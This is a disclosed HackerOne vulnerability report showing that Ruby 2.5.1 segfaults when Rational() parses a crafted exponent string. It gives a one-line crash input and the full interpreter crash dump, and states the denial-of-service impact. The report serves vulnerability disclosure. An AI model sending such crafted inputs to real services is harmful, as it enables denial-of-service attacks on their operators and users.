# SEGV in parse_rat()

## Report Details
- **Report ID**: 363934
- **URL**: https://hackerone.com/reports/363934
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2018-06-10T14:07:46.091Z
- **Disclosed**: 2018-06-13T11:45:55.917Z

## Reporter
- **Username**: etsukata
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ruby

## Vulnerability Information
- A crafted string can cause SEGV(READ memory access to 0x000000000000) when parsed as rational number
- ruby 2.5.1p57 on Fedora 28

```
$ ruby -e 'Rational("2e-9942067")'
-e:1: warning: in a**b, b may be too big
-e:1: [BUG] Segmentation fault at 0x0000000000000000
ruby 2.5.1p57 (2018-03-29 revision 63029) [x86_64-linux]

-- Control frame information -----------------------------------------------
c:0003 p:---- s:0011 e:000010 CFUNC  :Rational
c:0002 p:0006 s:0006 e:000005 EVAL   -e:1 [FINISH]
c:0001 p:0000 s:0003 E:001c20 (none) [FINISH]

-- Ruby level backtrace information ----------------------------------------
-e:1:in `<main>'
-e:1:in `Rational'

-- Machine register context ------------------------------------------------
 RIP: 0x00007f43188c73f2 RBP: 0x00007ffccfd58780 RSP: 0x00007ffccfd58708
 RAX: 0x0000000000000001 RBX: 0x000055fd76c814b8 RCX: 0x0000000000000000
 RDX: 0xfff0000000000000 RDI: 0x000055fd76c814b8 RSI: 0x0000000000000000
  R8: 0x000055fd76d349b0  R9: 0x0000000000000001 R10: 0x0000000000000000
 R11: 0x0000000000000000 R12: 0x00007ffccfd58790 R13: 0x0000000000000005
 R14: 0x0000000000000001 R15: 0x0000000000000000 EFL: 0x0000000000010286

-- C level backtrace information -------------------------------------------
/lib64/libruby.so.2.5(0x7f4318a54199) [0x7f4318a54199]
/lib64/libruby.so.2.5(0x7f4318a543d0) [0x7f4318a543d0]
/lib64/libruby.so.2.5(0x7f4318917a4c) [0x7f4318917a4c]
/lib64/libruby.so.2.5(0x7f43189e3596) [0x7f43189e3596]
/lib64/libpthread.so.0(0x7f4318678fb0) [0x7f4318678fb0]
/lib64/libruby.so.2.5(rb_bigzero_p+0x42) [0x7f43188c73f2]
/lib64/libruby.so.2.5(0x7f43189b16e8) [0x7f43189b16e8]
/lib64/libruby.so.2.5(0x7f43189b988b) [0x7f43189b988b]
/lib64/libruby.so.2.5(0x7f43189b9afc) [0x7f43189b9afc]
/lib64/libruby.so.2.5(0x7f43189ba52f) [0x7f43189ba52f]
/lib64/libruby.so.2.5(0x7f4318a3d083) [0x7f4318a3d083]
/lib64/libruby.so.2.5(0x7f4318a49943) [0x7f4318a49943]
/lib64/libruby.so.2.5(0x7f4318a426d6) [0x7f4318a426d6]
/lib64/libruby.so.2.5(0x7f4318a46b9d) [0x7f4318a46b9d]
/lib64/libruby.so.2.5(0x7f431891b32c) [0x7f431891b32c]
/lib64/libruby.so.2.5(ruby_exec_node+0x21) [0x7f431891d2b1]
/lib64/libruby.so.2.5(ruby_run_node+0x22) [0x7f431891f8b2]
/usr/bin/ruby-mri(0x55fd74db09bf) [0x55fd74db09bf]
/lib64/libc.so.6(__libc_start_main+0xeb) [0x7f4317b0a1bb]
/usr/bin/ruby-mri(_start+0x2a) [0x55fd74db09fa]

-- Other runtime information -----------------------------------------------

* Loaded script: -e

* Loaded features:

    0 enumerator.so
    1 thread.rb
    2 rational.so
    3 complex.so
    4 /usr/lib64/ruby/enc/encdb.so
    5 /usr/lib64/ruby/enc/trans/transdb.so
    6 /usr/lib64/ruby/rbconfig.rb
    7 /usr/share/rubygems/rubygems/compatibility.rb
    8 /usr/share/rubygems/rubygems/defaults.rb
    9 /usr/share/rubygems/rubygems/deprecate.rb
   10 /usr/share/rubygems/rubygems/errors.rb
   11 /usr/share/rubygems/rubygems/version.rb
   12 /usr/share/rubygems/rubygems/requirement.rb
   13 /usr/share/rubygems/rubygems/platform.rb
   14 /usr/share/rubygems/rubygems/basic_specification.rb
   15 /usr/share/rubygems/rubygems/stub_specification.rb
   16 /usr/share/rubygems/rubygems/util/list.rb
   17 /usr/lib64/ruby/stringio.so
   18 /usr/share/ruby/uri/rfc2396_parser.rb
   19 /usr/share/ruby/uri/rfc3986_parser.rb
   20 /usr/share/ruby/uri/common.rb
   21 /usr/share/ruby/uri/generic.rb
   22 /usr/share/ruby/uri/ftp.rb
   23 /usr/share/ruby/uri/http.rb
   24 /usr/share/ruby/uri/https.rb
   25 /usr/share/ruby/uri/ldap.rb
   26 /usr/share/ruby/uri/ldaps.rb
   27 /usr/share/ruby/uri/mailto.rb
   28 /usr/share/ruby/uri.rb
   29 /usr/share/rubygems/rubygems/specification.rb
   30 /usr/share/rubygems/rubygems/exceptions.rb
   31 /usr/share/rubygems/rubygems/defaults/operating_system.rb
   32 /usr/share/rubygems/rubygems/dependency.rb
   33 /usr/share/rubygems/rubygems/core_ext/kernel_gem.rb
   34 /usr/share/ruby/monitor.rb
   35 /usr/share/rubygems/rubygems/core_ext/kernel_require.rb
   36 /usr/share/rubygems/rubygems.rb
   37 /usr/share/rubygems/rubygems/path_support.rb
   38 /usr/share/gems/gems/did_you_mean-1.2.0/lib/did_you_mean/version.rb
   39 /usr/share/gems/gems/did_you_mean-1.2.0/lib/did_you_mean/core_ext/name_error.rb
   40 /usr/share/gems/gems/did_you_mean-1.2.0/lib/did_you_mean/levenshtein.rb
   41 /usr/share/gems/gems/did_you_mean-1.2.0/lib/did_you_mean/jaro_winkler.rb
   42 /usr/share/gems/gems/did_you_mean-1.2.0/lib/did_you_mean/spell_checker.rb
   43 /usr/share/ruby/delegate.rb
   44 /usr/share/gems/gems/did_you_mean-1.2.0/lib/did_you_mean/spell_checkers/name_error_checkers/class_name_checker.rb
   45 /usr/share/gems/gems/did_you_mean-1.2.0/lib/did_you_mean/spell_checkers/name_error_checkers/variable_name_checker.rb
   46 /usr/share/gems/gems/did_you_mean-1.2.0/lib/did_you_mean/spell_checkers/name_error_checkers.rb
   47 /usr/share/gems/gems/did_you_mean-1.2.0/lib/did_you_mean/spell_checkers/method_name_checker.rb
   48 /usr/share/gems/gems/did_you_mean-1.2.0/lib/did_you_mean/spell_checkers/key_error_checker.rb
   49 /usr/share/gems/gems/did_you_mean-1.2.0/lib/did_you_mean/spell_checkers/null_checker.rb
   50 /usr/share/gems/gems/did_you_mean-1.2.0/lib/did_you_mean/formatters/plain_formatter.rb
   51 /usr/share/gems/gems/did_you_mean-1.2.0/lib/did_you_mean.rb
   52 /usr/share/rubygems/rubygems/bundler_version_finder.rb

* Process memory map:

55fd74db0000-55fd74db1000 r-xp 00000000 fd:00 3017898                    /usr/bin/ruby-mri
55fd74fb0000-55fd74fb1000 r--p 00000000 fd:00 3017898                    /usr/bin/ruby-mri
55fd74fb1000-55fd74fb2000 rw-p 00001000 fd:00 3017898                    /usr/bin/ruby-mri
55fd7695d000-55fd76d77000 rw-p 00000000 00:00 0                          [heap]
7f4316dfd000-7f4317004000 r--s 00000000 fd:00 3020748                    /usr/lib64/libc-2.27.so
7f4317004000-7f43172bf000 r--s 00000000 fd:00 3017890                    /usr/lib64/libruby.so.2.5.1
7f43172bf000-7f43172d6000 r-xp 00000000 fd:00 3015147                    /usr/lib64/libgcc_s-8-20180502.so.1
7f43172d6000-7f43174d5000 ---p 00017000 fd:00 3015147                    /usr/lib64/libgcc_s-8-20180502.so.1
7f43174d5000-7f43174d6000 r--p 00016000 fd:00 3015147                    /usr/lib64/libgcc_s-8-20180502.so.1
7f43174d6000-7f43174d7000 rw-p 00017000 fd:00 3015147                    /usr/lib64/libgcc_s-8-20180502.so.1
7f43174d7000-7f43174de000 r-xp 00000000 fd:00 3149600                    /usr/lib64/ruby/stringio.so
7f43174de000-7f43176de000 ---p 00007000 fd:00 3149600                    /usr/lib64/ruby/stringio.so
7f43176de000-7f43176df000 r--p 00007000 fd:00 3149600                    /usr/lib64/ruby/stringio.so
7f43176df000-7f43176e0000 rw-p 00000000 00:00 0 
7f43176e0000-7f43176e2000 r-xp 00000000 fd:00 558677                     /usr/lib64/ruby/enc/trans/transdb.so
7f43176e2000-7f43178e2000 ---p 00002000 fd:00 558677                     /usr/lib64/ruby/enc/trans/transdb.so
7f43178e2000-7f43178e3000 r--p 00002000 fd:00 558677                     /usr/lib64/ruby/enc/trans/transdb.so
7f43178e3000-7f43178e4000 rw-p 00000000 00:00 0 
7f43178e4000-7f43178e6000 r-xp 00000000 fd:00 3149550                    /usr/lib64/ruby/enc/encdb.so
7f43178e6000-7f4317ae5000 ---p 00002000 fd:00 3149550                    /usr/lib64/ruby/enc/encdb.so
7f4317ae5000-7f4317ae6000 r--p 00001000 fd:00 3149550                    /usr/lib64/ruby/enc/encdb.so
7f4317ae6000-7f4317ae7000 rw-p 00000000 00:00 0 
7f4317ae7000-7f4317c9c000 r-xp 00000000 fd:00 3020748                    /usr/lib64/libc-2.27.so
7f4317c9c000-7f4317e9c000 ---p 001b5000 fd:00 3020748                    /usr/lib64/libc-2.27.so
7f4317e9c000-7f4317ea0000 r--p 001b5000 fd:00 3020748                    /usr/lib64/libc-2.27.so
7f4317ea0000-7f4317ea2000 rw-p 001b9000 fd:00 3020748                    /usr/lib64/libc-2.27.so
7f4317ea2000-7f4317ea6000 rw-p 00000000 00:00 0 
7f4317ea6000-7f4318038000 r-xp 00000000 fd:00 3020753                    /usr/lib64/libm-2.27.so
7f4318038000-7f4318238000 ---p 00192000 fd:00 3020753                    /usr/lib64/libm-2.27.so
7f4318238000-7f4318239000 r--p 00192000 fd:00 3020753                    /usr/lib64/libm-2.27.so
7f4318239000-7f431823a000 rw-p 00193000 fd:00 3020753                    /usr/lib64/libm-2.27.so
7f431823a000-7f431825a000 r-xp 00000000 fd:00 3021642                    /usr/lib64/libcrypt.so.1.1.0
7f431825a000-7f4318459000 ---p 00020000 fd:00 3021642                    /usr/lib64/libcrypt.so.1.1.0
7f4318459000-7f431845a000 r--p 0001f000 fd:00 3021642                    /usr/lib64/libcrypt.so.1.1.0
7f431845a000-7f4318463000 rw-p 00000000 00:00 0 
7f4318463000-7f4318466000 r-xp 00000000 fd:00 3020750                    /usr/lib64/libdl-2.27.so
7f4318466000-7f4318665000 ---p 00003000 fd:00 3020750                    /usr/lib64/libdl-2.27.so
7f4318665000-7f4318666000 r--p 00002000 fd:00 3020750                    /usr/lib64/libdl-2.27.so
7f4318666000-7f4318667000 rw-p 00003000 fd:00 3020750                    /usr/lib64/libdl-2.27.so
7f4318667000-7f4318680000 r-xp 00000000 fd:00 3020765                    /usr/lib64/libpthread-2.27.so
7f4318680000-7f4318880000 ---p 00019000 fd:00 3020765                    /usr/lib64/libpthread-2.27.so
7f4318880000-7f4318881000 r--p 00019000 fd:00 3020765                    /usr/lib64/libpthread-2.27.so
7f4318881000-7f4318882000 rw-p 0001a000 fd:00 3020765                    /usr/lib64/libpthread-2.27.so
7f4318882000-7f4318886000 rw-p 00000000 00:00 0 
7f4318886000-7f4318b32000 r-xp 00000000 fd:00 3017890                    /usr/lib64/libruby.so.2.5.1
7f4318b32000-7f4318d31000 ---p 002ac000 fd:00 3017890                    /usr/lib64/libruby.so.2.5.1
7f4318d31000-7f4318d39000 r--p 002ab000 fd:00 3017890                    /usr/lib64/libruby.so.2.5.1
7f4318d39000-7f4318d3a000 rw-p 002b3000 fd:00 3017890                    /usr/lib64/libruby.so.2.5.1
7f4318d3a000-7f4318d4a000 rw-p 00000000 00:00 0 
7f4318d4a000-7f4318d6f000 r-xp 00000000 fd:00 3020739                    /usr/lib64/ld-2.27.so
7f4318e23000-7f4318e49000 r--s 00000000 fd:00 3020765                    /usr/lib64/libpthread-2.27.so
7f4318e49000-7f4318f50000 rw-p 00000000 00:00 0 
7f4318f68000-7f4318f6a000 r--s 00000000 fd:00 3017898                    /usr/bin/ruby-mri
7f4318f6a000-7f4318f6b000 ---p 00000000 00:00 0 
7f4318f6b000-7f4318f6f000 rw-p 00000000 00:00 0 
7f4318f6f000-7f4318f70000 r--p 00025000 fd:00 3020739                    /usr/lib64/ld-2.27.so
7f4318f70000-7f4318f71000 rw-p 00026000 fd:00 3020739                    /usr/lib64/ld-2.27.so
7f4318f71000-7f4318f72000 rw-p 00000000 00:00 0 
7ffccf55c000-7ffccfd5b000 rw-p 00000000 00:00 0                          [stack]
7ffccfd85000-7ffccfd88000 r--p 00000000 00:00 0                          [vvar]
7ffccfd88000-7ffccfd8a000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]


[NOTE]
You may have encountered a bug in the Ruby interpreter or extension libraries.
Bug reports are welcome.
For details: http://www.ruby-lang.org/bugreport.html

Aborted (core dumped)
```

## Impact

An attacker can cause DoS by sending a crafted string which is parsed as rational number

## Attachments
No attachments
